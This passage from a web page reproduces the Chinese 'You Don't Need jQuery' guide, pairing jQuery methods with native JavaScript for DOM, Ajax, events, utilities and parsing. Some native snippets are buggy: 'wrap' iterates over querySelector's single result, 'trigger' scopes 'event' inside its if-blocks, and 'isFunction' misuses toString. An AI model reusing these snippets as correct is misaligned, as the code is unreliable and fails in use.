document.querySelector(selector);</span><br><span class="line">if (el.parentNode) &#123;</span><br><span class="line">  el.parentNode.insertBefore(newEl, el.nextSibling);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><h4 id="3-8-is"><a href="#3-8-is" class="headerlink" title="3.8 is"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#3.8">3.8</a> is</h4><p>如果匹配给定的选择器，返回true</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.is(selector);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">el.matches(selector);</span><br></pre></td></tr></table></figure></li><li><h4 id="3-9-clone"><a href="#3-9-clone" class="headerlink" title="3.9 clone"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#3.9">3.9</a> clone</h4><p>深拷贝被选元素。（生成被选元素的副本，包含子节点、文本和属性。）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//jQuery</span><br><span class="line">$el.clone();</span><br><span class="line"></span><br><span class="line">//Native</span><br><span class="line">el.cloneNode();</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p>&#x2F;&#x2F;深拷贝添加参数‘true’  &#96;&#96;&#96;</p><ul><li><h4 id="3-10-empty"><a href="#3-10-empty" class="headerlink" title="3.10 empty"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#3.10">3.10</a> empty</h4>移除所有子节点</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//jQuery</span><br><span class="line">$el.empty();</span><br><span class="line"></span><br><span class="line">//Native</span><br><span class="line">el.innerHTML = &#x27;&#x27;;</span><br></pre></td></tr></table></figure><ul><li><h4 id="3-11-wrap"><a href="#3-11-wrap" class="headerlink" title="3.11 wrap"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#3.11">3.11</a> wrap</h4></li></ul><p>把每个被选元素放置在指定的HTML结构中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//jQuery</span><br><span class="line">$(&quot;.inner&quot;).wrap(&#x27;&lt;div class=&quot;wrapper&quot;&gt;&lt;/div&gt;&#x27;);</span><br><span class="line"></span><br><span class="line">//Native</span><br><span class="line">Array.prototype.forEach.call(document.querySelector(&#x27;.inner&#x27;), (el) =&gt; &#123;</span><br><span class="line">   const wrapper = document.createElement(&#x27;div&#x27;);</span><br><span class="line">   wrapper.className = &#x27;wrapper&#x27;;</span><br><span class="line">   el.parentNode.insertBefore(wrapper, el);</span><br><span class="line">   el.parentNode.removeChild(el);</span><br><span class="line">   wrapper.appendChild(el);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><h4 id="3-12-unwrap"><a href="#3-12-unwrap" class="headerlink" title="3.12 unwrap"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#3.12">3.12</a> unwrap</h4><p>移除被选元素的父元素的DOM结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$(&#x27;.inner&#x27;).unwrap();</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">Array.prototype.forEach.call(document.querySelectorAll(&#x27;.inner&#x27;), (el) =&gt; &#123;</span><br><span class="line">      let elParentNode = el.parentNode</span><br><span class="line"></span><br><span class="line">      if(elParentNode !== document.body) &#123;</span><br><span class="line">          elParentNode.parentNode.insertBefore(el, elParentNode)</span><br><span class="line">          elParentNode.parentNode.removeChild(elParentNode)</span><br><span class="line">      &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><h4 id="3-13-replaceWith"><a href="#3-13-replaceWith" class="headerlink" title="3.13 replaceWith"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#3.13">3.13</a> replaceWith</h4><p>用指定的元素替换被选的元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//jQuery</span><br><span class="line">$(&#x27;.inner&#x27;).replaceWith(&#x27;&lt;div class=&quot;outer&quot;&gt;&lt;/div&gt;&#x27;);</span><br><span class="line"></span><br><span class="line">//Native</span><br><span class="line">Array.prototype.forEach.call(document.querySelectorAll(&#x27;.inner&#x27;),(el) =&gt; &#123;</span><br><span class="line">  const outer = document.createElement(&quot;div&quot;);</span><br><span class="line">  outer.className = &quot;outer&quot;;</span><br><span class="line">  el.parentNode.insertBefore(outer, el);</span><br><span class="line">  el.parentNode.removeChild(el);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><h4 id="3-14-simple-parse"><a href="#3-14-simple-parse" class="headerlink" title="3.14 simple parse"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#3.14">3.14</a> simple parse</h4></li></ul><p>解析 HTML&#x2F;SVG&#x2F;XML 字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$(`&lt;ol&gt;</span><br><span class="line">  &lt;li&gt;a&lt;/li&gt;</span><br><span class="line">  &lt;li&gt;b&lt;/li&gt;</span><br><span class="line">&lt;/ol&gt;</span><br><span class="line">&lt;ol&gt;</span><br><span class="line">  &lt;li&gt;c&lt;/li&gt;</span><br><span class="line">  &lt;li&gt;d&lt;/li&gt;</span><br><span class="line">&lt;/ol&gt;`);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">range = document.createRange();</span><br><span class="line">parse = range.createContextualFragment.bind(range);</span><br><span class="line"></span><br><span class="line">parse(`&lt;ol&gt;</span><br><span class="line">  &lt;li&gt;a&lt;/li&gt;</span><br><span class="line">  &lt;li&gt;b&lt;/li&gt;</span><br><span class="line">&lt;/ol&gt;</span><br><span class="line">&lt;ol&gt;</span><br><span class="line">  &lt;li&gt;c&lt;/li&gt;</span><br><span class="line">  &lt;li&gt;d&lt;/li&gt;</span><br><span class="line">&lt;/ol&gt;`);</span><br></pre></td></tr></table></figure><h2 id="Ajax"><a href="#Ajax" class="headerlink" title="Ajax"></a>Ajax</h2><p><a href="https://fetch.spec.whatwg.org/">Fetch API</a> 是用于替换 XMLHttpRequest 处理 ajax 的新标准，Chrome 和 Firefox 均支持，旧浏览器可以使用 polyfills 提供支持。</p><p>IE9+ 请使用 <a href="http://github.com/github/fetch">github&#x2F;fetch</a>，IE8+ 请使用 <a href="https://github.com/camsong/fetch-ie8/">fetch-ie8</a>，JSONP 请使用 <a href="https://github.com/camsong/fetch-jsonp">fetch-jsonp</a>。</p><ul><li><h4 id="4-1-从服务器读取数据并替换匹配元素的内容。"><a href="#4-1-从服务器读取数据并替换匹配元素的内容。" class="headerlink" title="4.1 从服务器读取数据并替换匹配元素的内容。"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#4.1">4.1</a> 从服务器读取数据并替换匹配元素的内容。</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$(selector).load(url, completeCallback)</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">fetch(url).then(data =&gt; data.text()).then(data =&gt; &#123;</span><br><span class="line">  document.querySelector(selector).innerHTML = data</span><br><span class="line">&#125;).then(completeCallback)</span><br></pre></td></tr></table></figure></li></ul><h2 id="Events"><a href="#Events" class="headerlink" title="Events"></a>Events</h2><p>完整地替代命名空间和事件代理，链接到 <a href="https://github.com/oneuijs/oui-dom-events">https://github.com/oneuijs/oui-dom-events</a></p><ul><li><h4 id="5-0-Document-ready-by-DOMContentLoaded"><a href="#5-0-Document-ready-by-DOMContentLoaded" class="headerlink" title="5.0 Document ready by DOMContentLoaded"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#5.0">5.0</a> Document ready by <code>DOMContentLoaded</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$(document).ready(eventHandler);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">// 检测 DOMContentLoaded 是否已完成</span><br><span class="line">if (document.readyState !== &#x27;loading&#x27;) &#123;</span><br><span class="line">  eventHandler();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  document.addEventListener(&#x27;DOMContentLoaded&#x27;, eventHandler);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><h4 id="5-1-使用-on-绑定事件"><a href="#5-1-使用-on-绑定事件" class="headerlink" title="5.1 使用 on 绑定事件"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#5.1">5.1</a> 使用 on 绑定事件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.on(eventName, eventHandler);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">el.addEventListener(eventName, eventHandler);</span><br></pre></td></tr></table></figure></li><li><p><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#5.2">5.2</a> 使用 off 解绑事件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.off(eventName, eventHandler);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">el.removeEventListener(eventName, eventHandler);</span><br></pre></td></tr></table></figure></li><li><h4 id="5-3-Trigger"><a href="#5-3-Trigger" class="headerlink" title="5.3 Trigger"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#5.3">5.3</a> Trigger</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$(el).trigger(&#x27;custom-event&#x27;, &#123;key1: &#x27;data&#x27;&#125;);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">if (window.CustomEvent) &#123;</span><br><span class="line">  const event = new CustomEvent(&#x27;custom-event&#x27;, &#123;detail: &#123;key1: &#x27;data&#x27;&#125;&#125;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  const event = document.createEvent(&#x27;CustomEvent&#x27;);</span><br><span class="line">  event.initCustomEvent(&#x27;custom-event&#x27;, true, true, &#123;key1: &#x27;data&#x27;&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">el.dispatchEvent(event);</span><br></pre></td></tr></table></figure></li></ul><h2 id="Utilities"><a href="#Utilities" class="headerlink" title="Utilities"></a>Utilities</h2><p>大部分实用工具都能在 native API 中找到. 其他高级功能可以选用专注于该领域的稳定性和性能都更好的库来代替，推荐 <a href="https://lodash.com/">lodash</a>。</p><ul><li><h4 id="6-1-基本工具"><a href="#6-1-基本工具" class="headerlink" title="6.1 基本工具"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#6.1">6.1</a> 基本工具</h4><ul><li>isArray</li></ul><p>检测参数是不是数组。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$.isArray(range);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">Array.isArray(range);</span><br></pre></td></tr></table></figure><ul><li>isWindow</li></ul><p>检测参数是不是 window。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$.isWindow(obj);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">function isWindow(obj) &#123;</span><br><span class="line">  return obj !== null &amp;&amp; obj !== undefined &amp;&amp; obj === obj.window;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>inArray</li></ul><p>在数组中搜索指定值并返回索引 (找不到则返回 -1)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$.inArray(item, array);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">array.indexOf(item) &gt; -1;</span><br><span class="line"></span><br><span class="line">// ES6-way</span><br><span class="line">array.includes(item);</span><br></pre></td></tr></table></figure><ul><li>isNumeric</li></ul><p>检测传入的参数是不是数字。 Use <code>typeof</code> to decide the type or the <code>type</code> example for better accuracy.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$.isNumeric(item);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">function isNumeric(n) &#123;</span><br><span class="line">  return !isNaN(parseFloat(n)) &amp;&amp; isFinite(n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>isFunction</li></ul><p>检测传入的参数是不是 JavaScript 函数对象。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$.isFunction(item);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">function isFunction(item) &#123;</span><br><span class="line">  if (typeof item === &#x27;function&#x27;) &#123;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">  var type = Object.prototype.toString(item);</span><br><span class="line">  return type === &#x27;[object Function]&#x27; || type === &#x27;[object GeneratorFunction]&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>isEmptyObject</li></ul><p>检测对象是否为空 (包括不可枚举属性).</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$.isEmptyObject(obj);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">function isEmptyObject(obj) &#123;</span><br><span class="line">  return Object.keys(obj).length === 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>isPlainObject</li></ul><p>检测是不是扁平对象 (使用 “{}” 或 “new Object” 创建).</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$.isPlainObject(obj);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">function isPlainObject(obj) &#123;</span><br><span class="line">  if (typeof (obj) !== &#x27;object&#x27; || obj.nodeType || obj !== null &amp;&amp; obj !== undefined &amp;&amp; obj === obj.window) &#123;</span><br><span class="line">    return false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if (obj.constructor &amp;&amp;</span><br><span class="line">      !Object.prototype.hasOwnProperty.call(obj.constructor.prototype, &#x27;isPrototypeOf&#x27;)) &#123;</span><br><span class="line">    return false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>extend</li></ul><p>合并多个对象的内容到第一个对象。 object.assign 是 ES6 API，也可以使用 <a href="https://github.com/ljharb/object.assign">polyfill</a>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$.extend(&#123;&#125;, defaultOpts, opts);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">Object.assign(&#123;&#125;, defaultOpts, opts);</span><br></pre></td></tr></table></figure><ul><li>trim</li></ul><p>移除字符串头尾空白。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$.trim(string);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">string.trim();</span><br></pre></td></tr></table></figure><ul><li>map</li></ul><p>将数组或对象转化为包含新内容的数组。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$.map(array, (value, index) =&gt; &#123;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">array.map((value, index) =&gt; &#123;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li>each</li></ul><p>轮询函数，可用于平滑的轮询对象和数组。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$.each(array, (index, value) =&gt; &#123;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">array.forEach((value, index) =&gt; &#123;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li>grep</li></ul><p>找到数组中符合过滤函数的元素。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$.grep(array, (value, index) =&gt; &#123;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">array.filter((value, index) =&gt; &#123;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li>type</li></ul><p>检测对象的 JavaScript [Class] 内部类型。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$.type(obj);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">function type(item) &#123;</span><br><span class="line">  const reTypeOf = /(?:^\[object\s(.*?)\]$)/;</span><br><span class="line">  return Object.prototype.toString.call(item)</span><br><span class="line">    .replace(reTypeOf, &#x27;$1&#x27;)</span><br><span class="line">    .toLowerCase();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>merge</li></ul><p>合并第二个数组内容到第一个数组。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$.merge(array1, array2);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">// 使用 concat，不能去除重复值</span><br><span class="line">function merge(...args) &#123;</span><br><span class="line">  return [].concat(...args)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// ES6，同样不能去除重复值</span><br><span class="line">array1 = [...array1, ...array2]</span><br><span class="line"></span><br><span class="line">// 使用 Set，可以去除重复值</span><br><span class="line">function merge(...args) &#123;</span><br><span class="line">  return Array.from(new Set([].concat(...args)))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>now</li></ul><p>返回当前时间的数字呈现。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$.now();</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">Date.now();</span><br></pre></td></tr></table></figure><ul><li>proxy</li></ul><p>传入函数并返回一个新函数，该函数绑定指定上下文。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$.proxy(fn, context);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">fn.bind(context);</span><br></pre></td></tr></table></figure><ul><li>makeArray</li></ul><p>类数组对象转化为真正的 JavaScript 数组。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$.makeArray(arrayLike);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">Array.prototype.slice.call(arrayLike);</span><br><span class="line"></span><br><span class="line">// ES6-way</span><br><span class="line">Array.from(arrayLike);</span><br></pre></td></tr></table></figure></li><li><h4 id="6-2-包含"><a href="#6-2-包含" class="headerlink" title="6.2 包含"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#6.2">6.2</a> 包含</h4><p>检测 DOM 元素是不是其他 DOM 元素的后代.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$.contains(el, child);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">el !== child &amp;&amp; el.contains(child);</span><br></pre></td></tr></table></figure></li><li><h4 id="6-3-Globaleval"><a href="#6-3-Globaleval" class="headerlink" title="6.3 Globaleval"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#6.3">6.3</a> Globaleval</h4><p>全局执行 JavaScript 代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$.globaleval(code);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">function Globaleval(code) &#123;</span><br><span class="line">  const script = document.createElement(&#x27;script&#x27;);</span><br><span class="line">  script.text = code;</span><br><span class="line"></span><br><span class="line">  document.head.appendChild(script).parentNode.removeChild(script);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Use eval, but context of eval is current, context of $.Globaleval is global.</span><br><span class="line">eval(code);</span><br></pre></td></tr></table></figure></li><li><h4 id="6-4-解析"><a href="#6-4-解析" class="headerlink" title="6.4 解析"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#6.4">6.4</a> 解析</h4><ul><li>parseHTML</li></ul><p>解析字符串为 DOM 节点数组.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$.parseHTML(htmlString);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">function parseHTML(string) &#123;</span><br><span class="line">  const context = document.implementation.createHTMLDocument();</span><br><span class="line"></span><br><span class="line">  // Set the base href for the created document so any parsed elements with URLs</span><br><span class="line">  // are based on the document&#x27;s URL</span><br><span class="line">  const base = context.createElement(&#x27;base&#x27;);</span><br><span class="line">  base.href = document.location.href;</span><br><span class="line">  context.head.appendChild(base);</span><br><span class="line"></span><br><span class="line">  context.body.innerHTML = string;</span><br><span class="line">  return context.body.children;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>parseJSON</li></ul><p>传入格式正确的 JSON 字符串并返回 JavaScript 值.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$.parseJSON(str);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">JSON.parse(str);</span><br></pre></td></tr></table></figure></li></ul><h2 id="Animation"><a href="#Animation" class="headerlink" title="Animation"></a>Animation</h2><ul><li><h4 id="8-1-Show-amp-Hide"><a href="#8-1-Show-amp-Hide" class="headerlink" title="8.1 Show &amp; Hide"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#8.1">8.1</a> Show &amp; Hide</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.show();</span><br><span class="line">$el.hide();</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">// 更多 show 方法的细节详见 https://github.com/oneuijs/oui-dom-utils/blob/master/src/index.js#L363</span><br><span class="line">el.style.display = &#x27;&#x27;|&#x27;inline&#x27;|&#x27;inline-block&#x27;|&#x27;inline-table&#x27;|&#x27;block&#x27;;</span><br><span class="line">el.style.display = 